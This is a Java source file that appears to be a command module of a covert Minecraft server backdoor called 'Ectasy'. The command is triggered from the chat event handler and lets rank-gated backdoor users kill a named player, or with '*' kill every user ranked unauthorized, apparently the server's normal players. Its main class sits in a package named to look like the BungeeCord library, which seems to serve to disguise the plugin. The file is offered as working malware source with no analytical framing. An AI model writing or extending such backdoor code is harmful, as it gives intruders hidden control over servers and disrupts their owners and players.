package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.user.User;
import fr.body.ectasy.util.ChatUtil;
import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.scheduler.BukkitRunnable;

@CommandInfo(
   name = "kill",
   description = "Kill a player",
   blatant = true,
   rank = Rank.FREE
)
public class KillCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent e, String var2, String[] args) {
      new BukkitRunnable() {
         @Override
         public void run() {
            if (args.length == 0) {
               ChatUtil.sendChat(e.getPlayer(), "Please, use kill <player name> or kill *");
            } else if (args[0].equals("*")) {
               for(User var2 : Ectasy.users.values()) {
                  if (var2.rank == Rank.UNAUTHORIZED) {
                     var2.player.setHealth(0.0);
                  }
               }

               ChatUtil.sendChat(e.getPlayer(), "Killed everyone.");
            } else {
               Player var1 = Bukkit.getServer().getPlayer(args[0]);
               if (var1 == null) {
                  ChatUtil.sendChat(e.getPlayer(), "The player " + args[0] + " is not online.");
               } else {
                  var1.setHealth(0.0);
                  ChatUtil.sendChat(e.getPlayer(), "Killed " + var1.getName());
               }
            }
         }
      }.runTask(Ectasy.parentPlugin);
   }
}
